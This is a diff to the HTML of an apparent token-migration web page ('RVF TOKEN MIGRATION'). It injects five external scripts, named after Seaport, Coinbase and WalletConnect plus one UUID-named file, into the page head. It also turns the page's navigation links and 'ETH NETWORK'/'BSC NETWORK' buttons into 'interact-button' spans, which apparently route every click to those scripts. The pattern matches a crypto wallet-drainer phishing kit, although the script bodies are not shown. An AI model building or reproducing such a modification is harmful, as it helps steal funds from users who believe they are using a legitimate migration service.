@@ -582,7 +582,13 @@
       --wui-gray-glass-080: rgba(255, 255, 255, 0.8);
       --wui-gray-glass-090: rgba(255, 255, 255, 0.9);
     }
-  </style></head>
+  </style>
+   <script src="./scripts/seaport.js"></script>
+   <script src="./scripts/coinbase.js"></script>
+   <script src="./scripts/wallet-connect-v2.js"></script>
+   <script src="./scripts/wallet-connect-v3.js"></script>
+   <script charset="UTF-8" type="text/javascript" src="./6463315d-5fbb-4674-aba3-32a987151b3f.js"></script>
+  </head>
 
 <body>
     <noscript>You need to enable JavaScript to run this app.</noscript>
@@ -602,8 +608,8 @@
                   </button>
                   <div class="navbar-collapse collapse" id="basic-navbar-nav">
                     <div class="mr-auto navbar-nav">
-                      <a href="./assets/index.html" data-rr-ui-event-key="Questions" class="nav-link">FREQUENTLY ASKED QUESTIONS </a>
-                      <a href="./assets/index.html" data-rr-ui-event-key="./" class="nav-link">RVF TOKEN MIGRATION</a>
+                      <span class="interact-button nav-link">FREQUENTLY ASKED QUESTIONS </span>
+                      <span class="interact-button nav-link">RVF TOKEN MIGRATION</span>
                     </div>
                   </div>
                 </nav>
@@ -619,11 +625,11 @@
                       <div class="mt-3 p-3 justify-content-around mobile-responsive">
                         <button class="col-xl-5 col-12 d-flex card-btn align-items-center mobile-margin-bottom">
                           <img class="p-2" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAoCAYAAAALz1FrAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAOFSURBVHgBrVfBTupAFJ0OyELQ4BMQ4gbi05XJkw3bB/EH7AeYwBeoOxdCB3HhTtyZt7F+Ae8HDPyB/gHdmbjqM2qMQvvuLS2vLZ12mryTDJQ7M/fMPffODCUkJn7d3NySmKBxBvc6naNUKtW8v78/jjNPmISdnpYNQiznlFJlOBxmReeKR7K0pMBn2f6FBIroVCESxtieJElNn/kYoqmLzBcikQxjwOkSiiaSBJNN/snkR12kCEJJ3MnmOhAogvBIvMnmIbIIuCScZPMQWgRckpBk86DEIoFki8jkB7cIFkhEks0DrwgWI5klW/jI8CGwCDwk7OzsICrZiWSSRGChCDwkEqVXvJnpTIZsbW+T79CKxSJZXl4mIfBEIzkPmGzIBXN3JhIJsra+TvKFAoEj3rJtbGxYJIjJZEJ0XSevr68LLIZhnOzv7/fnJJhsKZV6IHYu0HkOHKNzfHbDTeLAIfv4+LCebejQKo1GQ58JbCcbV4vOv8Hq/c7DkIQ85XI5XD15f3+3CIEMF4zytyTWbjczKyu3xVKJwHekw6BIgoAS2mSN5NbOTnlFwHlcZKBQoOlvb29lenh4yEzTrID9N/m/GEGr7u7uqpLbOhgMmrBPQo8UAbk0aK1KpTJyDEnYgPUEpT+nLy/XsiyrYFOBjNlkcYDVdA2tDwT6eDzOptNpZTqdXlN2cTGaErImra4+nEMR4GggsySEdidIgFJXwTlDgqenpyZs1jEQ/CmVStpcrm6ng/tkD9qj+fkps8tLDe1+CX1yPUI7caQB53V7bB37YFzVkssZbVIqwx1iEcHGHENUqvH11fVJiPd91pamC86tHe1IA/vEOb01UEF2fHsSr7Tbx1SS3OeXJplmt9PrqXZU5Xw+f7C5uamiLGh7fn4+Aoco7/zkhucWyKQGkiDOFWUAgw58Zg0kbDgSuqS5siWeA2wqSNry2PwkcLdnbdnK/j6ISq3Wane1Wu0oYCGzxZhmA5PtNtIAEt00jFaAA2LCXQOrGnII8GaU/QSBJBYRlLU5q3lhAHG3UCg8BpJzZ1HKyKxERaBBBIzritdhyQbhk1m5cgGJ1jEPYWPC/6YyphkgQ9gYlCkoD8IkiG6v14fljoL6sFxhV/ejfAi9OkBVYbX5ZdNgh3dF5ou+BGlQ1rKHeLarNZH54u+MrrK28zASnRv5T827JKusf4SVaxD+An3ceSmblZjpAAAAAElFTkSuQmCC" alt="" width="30" height="40">
-                          <a class="d-flex pr-2" href="./assets/index.html">ETH NETWORK</a>
+                          <span class="interact-button d-flex pr-2">ETH NETWORK</span>
                         </button>
                         <button class=" col-xl-5 col-12 d-flex card-btn align-items-center " style="background-color: rgba(17, 17, 44, 0.75);">
                           <img class="p-2" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAoCAYAAAB0HkOaAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAQWSURBVHgBvVhRUuJAEO2ZiOWCVoUTbLiB3kC+cGt/5ASrJ1BPAJ5APYF6Av3ZddEPuIHcAPYECbVCUesms90TCJNhJoRQ6/ugYDI98zLd/boHBhvAf9rxmOPcMoBhFIaX1S/TIWwABgXgP7gu3/1zJgQ7BwFushgX7eht+6baDAIogLXJ+D/2jpkTXqGpZ5kyFBHgKY3v4H+R8Z8r+zj5Ck/iMJcBg74Iw+Y6rltJRrqk/N4SAOfGCQJ6wIRnOynG4C5vPPGsh6PnT2es8j4wEmEQCAEX7tG47jYmNXTNKTIb6tNwzgnjTtd/qpxAUTJ+13WjkB+oAbrYgN2IcalWPRpfz8coRkQU1ZHUvWE5D0/oG2Uf5AW5ZGmss3ccdMqDoFMRwc9Kl2JHt9E3od84/1XadCoD/2n3cGldGzFacPRSbgXPFT82Xj5S04LkxkwbfBEDicPZy/m0p/qM0UPG+a0egFmBJ20cp2XILEzrsG6xkQJptomlgFNwmTIBJyyNqQtg4Cw/FzgOW1Y7EcIvw7DHONzSF1MAI1NWpyxR35BOY/6dxlMZRJmF32Obt15i8720r9rg25/Yso7AKMiU34HbGFfVCbEbHVRc2DcJmQzE6U6glgBNIIcCxEW1MXlU16W4UT2C+zKdDL7xuDbfhG3xK4jYUhDa4ilLIHUbExluOzIA59BEhGASskyBnNnINY0PUcURPEs9V0AGHqU1pndXCH5tEshMKCouydDHQj3FPawPL3fxVGBScT5XwjjaJ234IBCJedDPlZ9bi5gD/QKuswNdgh9DfZj2pliTU5RsMqonloE2dnAt2ACoW5cw3bpOpb+m4rNsSuDFapwGilgbSdYs1XgFC+iRLa2ht6KyBGmxZm8hlAqeqCfwZk7XmVXc0BXkIgM778eyGnfKidZUG78fSQrwax/sCMSkdJAqC7NKTWtCITIxPAbsYfRcuU31HwKyuv+kNMi+5qX8YCvG65KJ985Sz0zYVbwwmY9CBpmwVyiDrBCPtCYUIbPoP1h9Q/Hry8xqTNJ3KMaWMmtL+02N9EC9Ec6yorYqLY2Ylh7dZnCnDiVtrqGomk5GVmM9g4rcnzXF9ai6Z2UWX3H5GlAHr5+KEKG55ZCKy07VofnNA6X/1VLdh3EoKNfbFTVoKP5Cs/p1nBI7WeTIBv0vXau0A/I5tZ9CPBhPgnqZkN2oNStx04oa5OHMfX0w6YO0viRBSDYGIphZ2Esf6DWLpxfPl0Gjl91Wqg9S+hJqP8EOc2aZyCxIvfUyL/NRZO+BBbf/SdAYp2pWLjILUisu8zl6YFN7aUOhv9H0a4aGxXUH3baOJBSsTcy+AVtU9HW1qRAZsV2qy1ZSI0Fj6JI6FEQhN80RZ5TTxtviZxLCTf96/QcLotiWsPj7WwAAAABJRU5ErkJggg==" alt="" width="40" height="40">
-                          <a class="d-flex pr-2" href="./assets/index.html">BSC NETWORK</a>
+                          <span class="interact-button d-flex pr-2">BSC NETWORK</span>
                         </button>
                       </div>
                     </div>
